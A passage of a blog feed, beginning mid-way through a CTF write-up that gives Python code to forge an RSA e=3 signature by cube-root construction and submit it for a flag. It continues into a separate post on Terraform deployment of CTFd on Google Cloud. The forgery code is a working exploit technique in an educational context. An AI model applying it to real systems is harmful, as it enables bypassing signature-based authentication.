style=&quot;color:#64be81;&quot;&gt;\x86&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;H&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x03\x04\x02\x01\x05\x00\x04\x81\xbd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;sig_prefix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;cube_root&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(target_prefix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xff&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;34 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The suffix is simpler, the target suffix is the DerOctetString of our message&#x27;s sha256 digest.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;target_suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x04 \x14\xd4\x88&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;o&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x84\xa2\xa7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;8ge&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xbf\x7f\x88\xfe\x18\xac\xcc\x13&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x1e\x08\xe1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;ce&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xe0\xa7\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;TR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xf1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;sig_suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;gen_suffix&lt;&#x2F;span&gt;&lt;span&gt;(target_suffix)
&lt;&#x2F;span&gt;&lt;span&gt;suffix &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(sig_suffix)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now, we can concatenate them, with our garbage in between, and pad it with zeroes to fill the signature up to the required length. I simply play around with this until I get something that gets cubed such that our payload starts at the right offset. That is, when RSA decryption (cubing our input) is done, our we expect that &lt;code&gt;len(payload) == 256&lt;&#x2F;code&gt;, and &lt;code&gt;payload[0] = b&#x27;\x01&#x27;&lt;&#x2F;code&gt;, and so on...&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# play around with i until we get something that is of right order of magnitude
&lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;171
&lt;&#x2F;span&gt;&lt;span&gt;bad &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xcb\xfd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;Jz&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xdc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x05&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;X=y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xd7\x16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;]w&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xcf\x8d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;oK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x19\xa4\xc1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;@&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xdc\x9b\xf5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;Wk-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xeb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;bad &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;195 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;i)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;t=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xd3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;b#&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x98\xd1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\x14 \xba\x84\xd0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xcc\xb6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;G&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xb8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;Ra&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xbe&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xa1\x83&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;*&amp;gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\xc5\xd5\xde\x9d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;Q&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I used something like the following to test the validity of my payload.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(bad) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;256
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;binascii
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;binascii.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hexlify&lt;&#x2F;span&gt;&lt;span&gt;(bad).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;fromhex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;big&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;, n)
&lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(k, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;2048&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;big&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;verify&lt;&#x2F;span&gt;&lt;span&gt;(k)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# test with the function used in the remote server to make sure the payload works.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After forging the signature, the flag is obtained by posting the name, score and signature to the highscores endpoint. &lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep005ch03&quot;&gt;EP005CH03&lt;&#x2F;h2&gt;
&lt;p&gt;During the &amp;quot;HACKING GOOGLE&amp;quot; logo flash in the videos, morse code can be heard in the background. Decoding the morse code gives the flag.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Scalable CTF infrastructure: Part 1 - Scaling CTFd on GCP</title>
		<published>2022-08-31T00:00:00+00:00</published>
		<updated>2022-08-31T00:00:00+00:00</updated>
		<link rel="alternate" href="https://www.atteniemi.com/ctf-infra-writeup/" type="text/html"/>
		<id>https://www.atteniemi.com/ctf-infra-writeup/</id>
		<content type="html">&lt;p&gt;This post is about the infrastructure behind pwnEd 3, the third installment of the annual CTF competition hosted by SIGINT. This time, 45 teams or approximately 155 users signed up. We used Google Cloud Platform to host CTFd, and DigitalOcean to host our challenges on a Kubernetes cluster. In this post, I&#x27;m going to share our architecture and a few tricky bits we faced while setting the CTF up.&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;ctfd&quot;&gt;CTFd&lt;&#x2F;h2&gt;
&lt;p&gt;We wanted our CTFd deployment to be able to scale for larger CTFs we might host. Furthermore, by using Infrastructure as Code tools like Terraform and documenting the deployment process, we can ensure that future members of the society are able to also host CTFs with ease, without having to solve the same problems again.&lt;&#x2F;p&gt;
&lt;p&gt;We deploy CTFd on App Engine, backed by Cloud SQL and Memorystore Redis. Challenge files are served from a Cloud Storage Bucket.&lt;&#x2F;p&gt;
&lt;p&gt;The full Terraform source for our CTFd deployment is available at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;hur&#x2F;ctfd-gcp&quot;&gt;hur&#x2F;ctfd-gcp&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;hur&#x2F;ctfd-gcp&#x2F;master&#x2F;docs&#x2F;architecture_overview.svg&quot; alt=&quot;CTFd Architecture diagram&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The applications are deployed in a VPC, and only App Engine has a public IP address, and sits behind the App Engine load balancer, allowing us to add instances of CTFd easily. We used manual scaling in order for costs to be more predictable, but App Engine supports autoscaling and it is easily enabled if the number of instances is more volatile.&lt;&#x2F;p&gt;
&lt;p&gt;Cloud SQL and Redis are also easily configured with High Availability without having to worry about implementation details, making scaling up easier.&lt;&#x2F;p&gt;
&lt;p&gt;One thing to note when configuring CTFd in App Engine is that the &lt;code&gt;REVERSE_PROXY&lt;&#x2F;code&gt; variable needs to be set correctly. This is necessary for CTFd to correctly handle &lt;code&gt;X-Forwarded-&lt;&#x2F;code&gt; headers and enables it to correctly determine visitor IP addresses in the authentication log. &lt;&#x2F;p&gt;
&lt;p&gt;In our case, we are behind the App Engine load balancer and also the Cloudflare CDN, so we set &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;tf&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-tf &quot;&gt;&lt;code class=&quot;language-tf&quot; data-lang=&quot;tf&quot;&gt;&lt;span&gt;resource &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;google_app_engine_flexible_app_version&amp;quot; &amp;quot;ctfd&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;env_variables &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;REVERSE_PROXY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;2,1,0,0,0&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Furthermore, in order to get CTFd working with GCP&#x27;s storage buckets, 
we need to configure &lt;a href=&quot;https:&#x2F;&#x2F;cloud.google.com&#x2F;storage&#x2F;docs&#x2F;interoperability&quot;&gt;interoperability&lt;&#x2F;a&gt; using the V4 signing process and HMAC keys. &lt;&#x2F;p&gt;
&lt;p&gt;In terraform, we achieve this by adding an interop service account&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;tf&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-tf &quot;&gt;&lt;code class=&quot;language-tf&quot; data-lang=&quot;tf&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# Enable access key and secret to use with CTFd
&lt;&#x2F;span&gt;&lt;span&gt;resource &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;google_service_account&amp;quot; &amp;quot;interop_account&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;account_id &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;interop&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;project &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;google_project&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;ctf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;project_id
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;adding an HMAC key to the interop service account&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;tf&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-tf &quot;&gt;&lt;code class=&quot;language-tf&quot; data-lang=&quot;tf&quot;&gt;&lt;span&gt;resource &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;google_storage_hmac_key&amp;quot; &amp;quot;interop_key&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;service_account_email &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;google_service_account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;interop_account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;email
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and adding the service account as an IAM member to the bucket with the role &lt;code&gt;storage.objectAdmin&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;tf&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-tf &quot;&gt;&lt;code class=&quot;language-tf&quot; data-lang=&quot;tf&quot;&gt;&lt;span&gt;resource &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;google_storage_bucket_iam_member&amp;quot; &amp;quot;interop_iam&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;bucket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;google_storage_bucket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;challenge_files&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;name
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;role &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;roles&#x2F;storage.objectAdmin&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;member &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;serviceAccount:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;${&lt;&#x2F;span&gt;&lt;span&gt;google_service_account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;interop_account&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then, we can set the environment variables for CTFd like it was an S3 bucket.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;tf&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-tf &quot;&gt;&lt;code class=&quot;language-tf&quot; data-lang=&quot;tf&quot;&gt;&lt;span&gt;resource &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;google_app_engine_flexible_app_version&amp;quot; &amp;quot;ctfd&amp;quot; &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;env_variables &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        ...
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;AWS_ACCESS_KEY_ID &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; google_storage_hmac_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;interop_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;access_id
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;AWS_SECRET_ACCESS_KEY &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; google_storage_hmac_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;interop_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;secret
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;AWS_S3_BUCKET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; google_storage_bucket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;challenge_files&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;name
&lt;&#x2F;span&gt;&lt;span&gt;    }
